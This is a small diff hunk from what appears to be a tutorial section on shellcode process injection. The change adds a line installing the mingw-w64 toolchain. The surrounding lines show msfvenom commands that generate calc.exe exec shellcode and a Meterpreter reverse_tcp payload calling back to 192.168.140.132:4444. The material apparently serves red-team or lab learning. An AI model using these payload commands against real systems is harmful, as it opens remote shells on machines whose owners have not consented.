@@ -7,7 +7,7 @@
 **Fileless cousin of #13.** You skip the DLL entirely and inject raw machine code (shellcode) into the target process. The shellcode runs inside the target — launches calc, opens a reverse shell, drops Meterpreter, whatever your msfvenom command produced.
 
 ```bash
-
+sudo apt update && sudo apt install -y mingw-w64
 msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c -v shellcode
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.140.132 LPORT=4444 EXITFUNC=thread -f c -v shellcode
 
